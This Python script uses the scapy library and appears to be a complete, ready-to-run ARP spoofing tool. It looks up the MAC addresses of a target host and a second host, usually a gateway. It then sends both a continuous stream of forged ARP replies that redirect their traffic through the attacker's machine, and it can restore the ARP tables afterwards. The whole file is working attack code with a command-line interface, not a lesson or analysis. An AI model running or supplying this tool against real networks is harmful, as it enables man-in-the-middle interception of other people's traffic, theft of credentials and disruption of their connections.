#!/bin/python
import scapy.all as scapy
import argparse

def arp_ask(target_ip):
    """Send an ARP request to get the MAC address of a target IP."""
    arp_request = scapy.ARP(pdst=target_ip)
    packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request
    answered, _ = scapy.srp(packet, timeout=2, verbose=False)
    
    if not answered:
        print(f"[!] No response from {target_ip}")
        return None
    return answered[0][1].hwsrc  # Return the MAC address of the target

def arp_spoof(target_ip, spoof_ip, target_mac, spoof_mac):
    """Send a fake ARP response with correct Ethernet destination MAC."""
    if not target_mac or not spoof_mac:
        print(f"[!] Cannot spoof {target_ip} or {spoof_ip} - MAC address not found.")
        return

    print(f"[+] Sending ARP spoof to {target_ip} (hwdst={target_mac}, psrc={spoof_ip}, hwsrc={spoof_mac})")

    # Création du paquet avec en-tête Ethernet
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.sendp(packet, verbose=False)  # Utilisation de sendp() au lieu de send()

def arp_restore(target_ip, spoof_ip, target_mac, spoof_mac):
    """Restore the ARP table with the correct MAC address."""
    if not target_mac or not spoof_mac:
        print(f"[!] Cannot restore {target_ip} or {spoof_ip} - MAC address not found.")
        return

    print(f"[+] Restoring ARP table for {target_ip} (hwdst={target_mac}, psrc={spoof_ip}, hwsrc={spoof_mac})")

    # Création du paquet avec en-tête Ethernet
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.sendp(packet, count=5, verbose=False)  # Envoi multiple pour être sûr


def spoof(target_ip, spoof_ip):
    """Continuously send ARP spoofing packets until interrupted."""
    own_mac = scapy.get_if_hwaddr(scapy.conf.iface)  # Get the attacker's MAC address

    # Get the MAC addresses of the target and the spoofed IP
    target_mac = arp_ask(target_ip)
    spoof_mac = arp_ask(spoof_ip)

    if not target_mac or not spoof_mac:
        print("[!] Failed to retrieve MAC addresses. Exiting.")
        return

    try:
        while True:
            arp_spoof(target_ip, spoof_ip, target_mac, own_mac)
            arp_spoof(spoof_ip, target_ip, spoof_mac, own_mac)
            #time.sleep(0.1)  # Reduce CPU usage
    except KeyboardInterrupt:
        print("\n[+] Restoring ARP tables...")
        arp_restore(target_ip, spoof_ip, target_mac, spoof_mac)
        arp_restore(spoof_ip, target_ip, spoof_mac, target_mac)
        print("[+] ARP tables restored.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument('-t', '--target', type=str, required=True, help='Target IP address')
    parser.add_argument('-s', '--spoof', type=str, required=True, help='IP address to spoof')
    parser.add_argument('-r', '--restore', action='store_true', help='Restore ARP tables')

    args = parser.parse_args()

    if args.restore:
        target_mac = arp_ask(args.target)
        spoof_mac = arp_ask(args.spoof)
        arp_restore(args.target, args.spoof, target_mac, spoof_mac)
        arp_restore(args.spoof, args.target, spoof_mac, target_mac)
        print("[+] ARP tables restored.")
    else:
        spoof(args.target, args.spoof)
